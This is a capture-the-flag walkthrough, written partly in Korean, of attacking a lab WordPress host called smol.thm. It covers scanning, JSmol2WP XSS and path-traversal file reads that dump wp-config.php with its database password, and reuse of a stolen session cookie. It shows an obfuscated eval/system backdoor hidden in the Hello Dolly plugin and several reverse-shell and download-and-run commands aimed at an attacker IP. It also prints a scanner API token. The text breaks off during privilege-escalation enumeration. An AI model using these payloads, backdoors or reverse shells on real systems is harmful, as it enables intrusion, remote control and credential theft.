# IP: 10.10.97.230

# nmap -> 22, 80

http://www.smol.thm

Nmap scan report for 10.10.97.230
Host is up (0.29s latency).
Not shown: 995 closed tcp ports (reset), 3 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 3072 86:fb:3f:1f:18:c9:c9:32:cb:10:08:20:d0:f7:c3:58 (RSA)
| 256 ae:c8:74:d8:57:c1:26:67:92:b1:21:ef:9a:e0:c7:ea (ECDSA)
|\_ 256 59:77:71:a7:d8:b9:92:cc:00:e4:e3:b0:f9:16:03:f8 (ED25519)
80/tcp open http Apache httpd 2.4.41 ((Ubuntu))
|\_http-title: Did not follow redirect to http://www.smol.thm
|\_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.78 seconds

# 단서

# Suggested text: Our website address is: http://192.168.204.139.

# http://www.smol.thm/wp-login.php?redirect_to=http%3A%2F%2Fwww.smol.thm%2Findex.php%2F2023%2F08%2F16%2Frce%2F

# ffuf -> 워드프레스 구조 확인

ffuf -u http://www.smol.thm/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt

┌──(root㉿docker-desktop)-[/]
└─# ffuf -u http://www.smol.thm/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -o ffuf.txt -t 50

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev

---

:: Method : GET
:: URL : http://www.smol.thm/FUZZ
:: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
:: Output file : ffuf.txt
:: File format : json
:: Follow redirects : false
:: Calibration : false
:: Timeout : 10
:: Threads : 50
:: Matcher : Response status: 200-299,301,302,307,401,403,405,500

---

:: Progress: [50/207643] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:16] :: Errors: 0 ::
[ERR] NOPE
wp-content [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 4579ms]
wp-includes [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 510ms]
wp-admin [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 272ms]

# 결과 확인

```bash
sudo apt install jq
cat ffuf.txt | jq
```

# wpscan -> directory listing, CSRF, SSRF are found

wpscan --url http://www.smol.thm --api-token UkGyliOCsyQuHgPPpEip3b6wkbP5rAV2XaeWBYTogao

┌──(root㉿docker-desktop)-[/]
└─# wpscan --url http://www.smol.thm --api-token UkGyliOCsyQuHgPPpEip3b6wkbP5rAV2XaeWBYTogao

---

         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart

---

[+] URL: http://www.smol.thm/ [10.10.97.230]
[+] Started: Thu Jul 24 15:03:12 2025

Interesting Finding(s):

[+] Headers
| Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
| Found By: Headers (Passive Detection)
| Confidence: 100%

[+] XML-RPC seems to be enabled: http://www.smol.thm/xmlrpc.php
| Found By: Direct Access (Aggressive Detection)
| Confidence: 100%
| References:
| - http://codex.wordpress.org/XML-RPC_Pingback_API
| - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
| - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
| - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
| - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://www.smol.thm/readme.html
| Found By: Direct Access (Aggressive Detection)
| Confidence: 100%

[+] Upload directory has listing enabled: http://www.smol.thm/wp-content/uploads/
| Found By: Direct Access (Aggressive Detection)
| Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://www.smol.thm/wp-cron.php
| Found By: Direct Access (Aggressive Detection)
| Confidence: 60%
| References:
| - https://www.iplocation.net/defend-wordpress-from-ddos
| - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.7.1 identified (Outdated, released on 2024-11-21).
| Found By: Rss Generator (Passive Detection)
| - http://www.smol.thm/index.php/feed/, <generator>https://wordpress.org/?v=6.7.1</generator>
| - http://www.smol.thm/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.7.1</generator>

[+] WordPress theme in use: twentytwentythree
| Location: http://www.smol.thm/wp-content/themes/twentytwentythree/
| Last Updated: 2024-11-13T00:00:00.000Z
| Readme: http://www.smol.thm/wp-content/themes/twentytwentythree/readme.txt
| [!] The version is out of date, the latest version is 1.6
| [!] Directory listing is enabled
| Style URL: http://www.smol.thm/wp-content/themes/twentytwentythree/style.css
| Style Name: Twenty Twenty-Three
| Style URI: https://wordpress.org/themes/twentytwentythree
| Description: Twenty Twenty-Three is designed to take advantage of the new design tools introduced in WordPress 6....
| Author: the WordPress team
| Author URI: https://wordpress.org
|
| Found By: Urls In Homepage (Passive Detection)
|
| Version: 1.2 (80% confidence)
| Found By: Style (Passive Detection)
| - http://www.smol.thm/wp-content/themes/twentytwentythree/style.css, Match: 'Version: 1.2'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] jsmol2wp
| Location: http://www.smol.thm/wp-content/plugins/jsmol2wp/
| Latest Version: 1.07 (up to date)
| Last Updated: 2018-03-09T10:28:00.000Z
|
| Found By: Urls In Homepage (Passive Detection)
|
| [!] 2 vulnerabilities identified:
|

# 취약점

| [!] Title: JSmol2WP <= 1.07 - Unauthenticated Cross-Site Scripting (XSS)
| References:
| - https://wpscan.com/vulnerability/0bbf1542-6e00-4a68-97f6-48a7790d1c3e
| - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20462
| - https://www.cbiu.cc/2018/12/WordPress%E6%8F%92%E4%BB%B6jsmol2wp%E6%BC%8F%E6%B4%9E/#%E5%8F%8D%E5%B0%84%E6%80%A7XSS
|
| [!] Title: JSmol2WP <= 1.07 - Unauthenticated Server Side Request Forgery (SSRF)
| References:
| - https://wpscan.com/vulnerability/ad01dad9-12ff-404f-8718-9ebbd67bf611
| - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20463
| - https://www.cbiu.cc/2018/12/WordPress%E6%8F%92%E4%BB%B6jsmol2wp%E6%BC%8F%E6%B4%9E/#%E5%8F%8D%E5%B0%84%E6%80%A7XSS
|
| Version: 1.07 (100% confidence)
| Found By: Readme - Stable Tag (Aggressive Detection)
| - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt
| Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
| - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
Checking Config Backups - Time: 00:00:11 <=============================================================================================================================> (137 / 137) 100.00% Time: 00:00:11

[i] No Config Backups Found.

[+] WPScan DB API OK
| Plan: free
| Requests Done (during the scan): 3
| Requests Remaining: 22

[+] Finished: Thu Jul 24 15:03:41 2025
[+] Requests Done: 176
[+] Cached Requests: 5
[+] Data Sent: 43.933 KB
[+] Data Received: 254.962 KB
[+] Memory used: 265.801 MB
[+] Elapsed time: 00:00:28

# 취약점 그대로 악용하기 -> 사이트 웹 브라우저에 접속

# IP: 10.10.97.230, www.smol.thm -> CVE 취약점 확인

http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=saveFile&data=%3Cscript%3Ealert(/xss/)%3C/script%3E&mimetype=text/html;%20charset=utf-8

![](https://velog.velcdn.com/images/agnusdei1207/post/9489e7ee-b9c5-4def-b337-13f30ef6321f/image.png)

http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php

![](https://velog.velcdn.com/images/agnusdei1207/post/b10129e7-2e41-42c0-b15d-76ed89c0c5f3/image.png)

```

<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the web site, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/documentation/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'wpuser' );

/** Database password */
define( 'DB_PASSWORD', 'kbLSF2Vop#lw3rjDZ629*Z%G' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication unique keys and salts.
 *
 * Change these to different unique phrases! You can generate these using
 * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
 *
 * You can change these at any point in time to invalidate all existing cookies.
 * This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'put your unique phrase here' );
define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
define( 'NONCE_KEY',        'put your unique phrase here' );
define( 'AUTH_SALT',        'put your unique phrase here' );
define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
define( 'NONCE_SALT',       'put your unique phrase here' );

/**#@-*/

/**
 * WordPress database table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/documentation/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/* Add any custom values between this line and the "stop editing" line. */



/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';

```

# login

![](https://velog.velcdn.com/images/agnusdei1207/post/1d998ee7-0c88-412b-b447-5103a27aa833/image.png)

# Cookie Hijacking

![](https://velog.velcdn.com/images/agnusdei1207/post/f69cf5b3-c40e-4218-8d4c-afd383ab1e87/image.png)

# cookie (total 2)

Cookie: wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_45a7e4c82b517c5af328feabce4d0187=wpuser%7C1753668949%7CcPTwzE1cbFpF18C6ZZZnuwRE0D2eRXISGnrDPvbQcBv%7Cccf2b309c5881393194d94ea8fc1ff5c9b3a8324cfc1282e423f89ccc74ee070

# request test with cookie -> success

curl -i -L -H "Cookie: wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_45a7e4c82b517c5af328feabce4d0187=wpuser%7C1753668949%7CcPTwzE1cbFpF18C6ZZZnuwRE0D2eRXISGnrDPvbQcBv%7Cccf2b309c5881393194d94ea8fc1ff5c9b3a8324cfc1282e423f89ccc74ee070" -H "User-Agent: Mozilla/5.0" http://www.smol.thm/wp-admin/

# 사이트 탐색 중 시스템 접근을 위한 데이터 수집

![](https://velog.velcdn.com/images/agnusdei1207/post/b6ccdc9b-2df6-4ca3-a428-a4277f4f3dc4/image.png)
![](https://velog.velcdn.com/images/agnusdei1207/post/477f28cf-9889-4aef-8be6-8cedd95d97b1/image.png)
![](https://velog.velcdn.com/images/agnusdei1207/post/b2331716-58bb-4853-864a-5c8847a2f124/image.png)

1- [IMPORTANT] Check Backdoors: Verify the SOURCE CODE of "Hello Dolly" plugin as the site's code revision.

2- Set Up HTTPS: Configure an SSL certificate to enable HTTPS and encrypt data transmission.

3- Update Software: Regularly update your CMS, plugins, and themes to patch vulnerabilities.

4- Strong Passwords: Enforce strong passwords for users and administrators.

5- Input Validation: Validate and sanitize user inputs to prevent attacks like SQL injection and XSS.

6- [IMPORTANT] Firewall Installation: Install a web application firewall (WAF) to filter incoming traffic.

7- Backup Strategy: Set up regular backups of your website and databases.

8- [IMPORTANT] User Permissions: Assign minimum necessary permissions to users based on roles.

9- Content Security Policy: Implement a CSP to control resource loading and prevent malicious scripts.

10- Secure File Uploads: Validate file types, use secure upload directories, and restrict execution permissions.

11- Regular Security Audits: Conduct routine security assessments, vulnerability scans, and penetration tests.

# hello dolly source code 구글링 -> https://github.com/WordPress/hello-dolly -> hello.php 플러그인 파일 확인

http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php

# LFI 파일을 기준으로 플러그인 파일 유추 -> 무작위 시도

http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../../../hello.php
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../../hello.php
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../hello.php
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../hello.php
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../hello.php
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../hello.php

# http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../hello.php

# 플러그인 파일 구조 (php)

# IP: 10.10.97.230

# 취약한 코드 및 base64 텍스트 발견 -> eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='));

curl "http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/read=convert.base64-encode/resource=../../hello.php" > hello.b64
base64 -d hello.b64 > hello.php

```
<?php
/**
 * @package Hello_Dolly
 * @version 1.7.2
 */
/*
Plugin Name: Hello Dolly
Plugin URI: http://wordpress.org/plugins/hello-dolly/
Description: This is not just a plugin, it symbolizes the hope and enthusiasm of an entire generation summed up in two words sung most famously by Louis Armstrong: Hello, Dolly. When activated you will randomly see a lyric from <cite>Hello, Dolly</cite> in the upper right of your admin screen on every page.
Author: Matt Mullenweg
Version: 1.7.2
Author URI: http://ma.tt/
*/

function hello_dolly_get_lyric() {
	/** These are the lyrics to Hello Dolly */
	$lyrics = "Hello, Dolly
Well, hello, Dolly
It's so nice to have you back where you belong
You're lookin' swell, Dolly
I can tell, Dolly
You're still glowin', you're still crowin'
You're still goin' strong
I feel the room swayin'
While the band's playin'
One of our old favorite songs from way back when
So, take her wrap, fellas
Dolly, never go away again
Hello, Dolly
Well, hello, Dolly
It's so nice to have you back where you belong
You're lookin' swell, Dolly
I can tell, Dolly
You're still glowin', you're still crowin'
You're still goin' strong
I feel the room swayin'
While the band's playin'
One of our old favorite songs from way back when
So, golly, gee, fellas
Have a little faith in me, fellas
Dolly, never go away
Promise, you'll never go away
Dolly'll never go away again";

	// Here we split it into lines.
	$lyrics = explode( "\n", $lyrics );

	// And then randomly choose a line.
	return wptexturize( $lyrics[ mt_rand( 0, count( $lyrics ) - 1 ) ] );
}

// This just echoes the chosen line, we'll position it later.
function hello_dolly() {
	eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='));

	$chosen = hello_dolly_get_lyric();
	$lang   = '';
	if ( 'en_' !== substr( get_user_locale(), 0, 3 ) ) {
		$lang = ' lang="en"';
	}

	printf(
		'<p id="dolly"><span class="screen-reader-text">%s </span><span dir="ltr"%s>%s</span></p>',
		__( 'Quote from Hello Dolly song, by Jerry Herman:' ),
		$lang,
		$chosen
	);
}

// Now we set that function up to execute when the admin_notices action is called.
add_action( 'admin_notices', 'hello_dolly' );

// We need some CSS to position the paragraph.
function dolly_css() {
	echo "
	<style type='text/css'>
	#dolly {
		float: right;
		padding: 5px 10px;
		margin: 0;
		font-size: 12px;
		line-height: 1.6666;
	}
	.rtl #dolly {
		float: left;
	}
	.block-editor-page #dolly {
		display: none;
	}
	@media screen and (max-width: 782px) {
		#dolly,
		.rtl #dolly {
			float: none;
			padding-left: 0;
			padding-right: 0;
		}
	}
	</style>
	";
}

add_action( 'admin_head', 'dolly_css' );

```

# base64 decode

# IP: 10.10.97.230

echo -n "CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA=" | tr -d '=' | base64 -d

if (isset($_GET["\143\155\x64"])) { system($\_GET["\143\x6d\144"]); }

# printf 로 ascii 코드 디코딩 -> cmd 확인

┌──(root㉿docker-desktop)-[/]
└─# printf "\143\x6d\144\n"
cmd

┌──(root㉿docker-desktop)-[/]
└─# printf "\143\155\x64"
cmd

# base64로 인코딩한 것을 디코딩하여 자바스크립트를 실행 -> js는 php cmd 를 실행 -> 그렇다면 악성 RCE 명령어를 base64 로 encode 만 하면 될 것으로 보임

echo -n "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.136.212",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")" | base64

# payload manipulation

aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5F
VCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoMTAuOC4xMzYuMjEyLDEyMzQpKTtvcy5k
dXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5v
KCksMik7aW1wb3J0IHB0eTsgcHR5LnNwYXduKC9iaW4vYmFzaCk=

# connecting to the target -> SSRF successful URL manipulation

http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?cmd=aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5F
VCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoMTAuOC4xMzYuMjEyLDEyMzQpKTtvcy5k
dXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5v
KCksMik7aW1wb3J0IHB0eTsgcHR5LnNwYXduKC9iaW4vYmFzaCk=

http://www.smol.thm/wp-admin/?cmd=aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5F
VCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoMTAuOC4xMzYuMjEyLDEyMzQpKTtvcy5k
dXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5v
KCksMik7aW1wb3J0IHB0eTsgcHR5LnNwYXduKC9iaW4vYmFzaCk=

# fail -> maybe directory listing...? -> 분명히 플러그인이 취약점인데..!

No such file or directory
bash: VCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoMTAuOC4xMzYuMjEyLDEyMzQpKTtvcy5k: command not found
bash: dXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5v: command not found

# http://www.smol.thm/wp-admin/index.php -> 관리자 페이지에서 플러그인 사용하는 것 확인 -> cmd 취약점이 가능한 페이지 찾기

![](https://velog.velcdn.com/images/agnusdei1207/post/203b4452-c71a-414a-b29c-86e95d1b2a8f/image.png)

# 아까 탈취했던 쿠키 활용

curl -L -H "Cookie: wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_45a7e4c82b517c5af328feabce4d0187=wpuser%7C1753668949%7CcPTwzE1cbFpF18C6ZZZnuwRE0D2eRXISGnrDPvbQcBv%7Cccf2b309c5881393194d94ea8fc1ff5c9b3a8324cfc1282e423f89ccc74ee070" -H "User-Agent: Mozilla/5.0" http://www.smol.thm/wp-admin/profile.php?cmd=ls | bat -l html

# 중간에 쉬다와서 다시 쿠키 탈취 필요 (with burpsuite)

# IP: 10.10.97.230

POST /wp-login.php HTTP/1.1
Host: www.smol.thm
Content-Length: 168
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://www.smol.thm
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10*15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/\_;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://www.smol.thm/wp-login.php?redirect_to=http%3A%2F%2Fwww.smol.thm%2Findex.php%2F2023%2F08%2F16%2Frce%2F
Accept-Encoding: gzip, deflate, br
Cookie: wordpress_test_cookie=WP%20Cookie%20check
Connection: keep-alive

log=wpuser&pwd=kbLSF2Vop%23lw3rjDZ629\*Z%25G&rememberme=forever&wp-submit=Log+In&redirect_to=http%3A%2F%2Fwww.smol.thm%2Findex.php%2F2023%2F08%2F16%2Frce%2F&testcookie=1

# login -> gui 불편하니까 cli 환경으로 전환

curl -i -X POST "http://www.smol.thm/wp-login.php" -H "Content-Type: application/x-www-form-urlencoded" -H "User-Agent: Mozilla/5.0" --data "log=wpuser&pwd=kbLSF2Vop%23lw3rjDZ629\*Z%25G&rememberme=forever&wp-submit=Log+In&redirect_to=http://www.smol.thm/wp-admin/" -c cookie.txt

# 이제 RCE 취약점이 있는 위치 탐색하기

curl -b cookie.txt -L http://www.smol.thm/wp-admin

# 바로 발견! -> 플러그인을 wp 전역에서 사용하는 걸로 보임

curl -b cookie.txt -L http://www.smol.thm/wp-admin/profile.php?cmd=ls

about.php
admin-ajax.php
admin-footer.php
admin-functions.php
admin-header.php
admin-post.php
admin.php
async-upload.php
authorize-application.php
comment.php
contribute.php
credits.php
css
custom-background.php
custom-header.php
customize.php
edit-comments.php
edit-form-advanced.php
edit-form-blocks.php
edit-form-comment.php
edit-link-form.php
edit-tag-form.php
edit-tags.php
edit.php
erase-personal-data.php
export-personal-data.php
export.php
freedoms.php
images
import.php
includes
index.php
install-helper.php
install.php
js
link-add.php
link-manager.php
link-parse-opml.php
link.php
load-scripts.php
load-styles.php
maint
media-new.php
media-upload.php
media.php
menu-header.php
menu.php

# reverse shell 연결

curl -b cookie.txt -L http://www.smol.thm/wp-admin/profile.php?cmd=bash -i >& /dev/tcp/10.8.136.212/1234 0>&1

2. **리버스 쉘 스크립트 작성**

```bash
echo "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.8.136.212/1234 0>&1'" > rev.sh

```

3. **공격자가 악성 스크립트 배포를 위한 서빙**

```bash
python3 -m http.server 6666
```

4. **타겟에서 스크립트 다운로드** -> 안전하게 /tmp 에 설치

rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc {Your IP} 4444 > /tmp/f

curl -b cookie.txt -L http://www.smol.thm/wp-admin/profile.php?cmd=wget http://10.8.136.212:6666/rev.sh -O /tmp/rev.sh
curl -b cookie.txt -L http://www.smol.thm/wp-admin/profile.php?cmd=chmod +x /tmp/rev.sh
curl -b cookie.txt -L http://www.smol.thm/wp-admin/profile.php?cmd=cat /tmp/rev.sh > tmp.txt
curl -b cookie.txt -L http://www.smol.thm/wp-admin/profile.php?cmd=ls -al /tmp/
cat tmp.txt | batcat

curl -b cookie.txt -L http://www.smol.thm/wp-admin/profile.php?cmd=ls | batcat

5. **타겟에서 리버스 쉘 실행**

curl -b cookie.txt -L http://www.smol.thm/wp-admin/profile.php?cmd=sh /tmp/rev.sh
curl -b cookie.txt -L http://www.smol.thm/wp-admin/profile.php?cmd=sh -i >& /dev/tcp/10.8.136.212/1234 0>&1

# 위 방식이 잘 작동하지 않음 -> 인코딩 필요

```python
import urllib.parse

text = "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.8.136.212 4444 > /tmp/f"
encoded = urllib.parse.quote(text)
print(encoded)
```

┌──(root㉿docker-desktop)-[/]
└─# python3 test.py
rm%20/tmp/f%3B%20mkfifo%20/tmp/f%3B%20cat%20/tmp/f%20%7C%20sh%20-i%202%3E%261%20%7C%20nc%2010.8.136.212%201234%20%3E%20/tmp/f

curl -b cookie.txt -L http://www.smol.thm/wp-admin/profile.php?cmd=rm%20/tmp/f%3B%20mkfifo%20/tmp/f%3B%20cat%20/tmp/f%20%7C%20sh%20-i%202%3E%261%20%7C%20nc%2010.8.136.212%201234%20%3E%20/tmp/f

# reverse shell success

┌──(root㉿docker-desktop)-[/]
└─# nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.8.136.212] from (UNKNOWN) [10.10.97.230] 51558
sh: 0: can't access tty; job control turned off

# privilege escalation

$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ whoami
www-data
$ pwd
/var/www/wordpress/wp-admin
$ cat /etc/os-release
NAME="Ubuntu"
VERSION="20.04.6 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.6 LTS"
VERSION_ID="20.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal

$ ls /
bin
boot
dev
etc
home
lib
lib32
lib64
libx32
lost+found
media
mnt
opt
proc
root
run
sbin
srv
swap.img
sys
tmp
usr
var
$

$ ls /home
diego
gege
ssm-user
think
ubuntu
xavi

$ cat /etc/passwd
root:x:0:0:root:/root:/usr/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
\_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
think:x:1000:1000:,,,:/home/think:/bin/bash
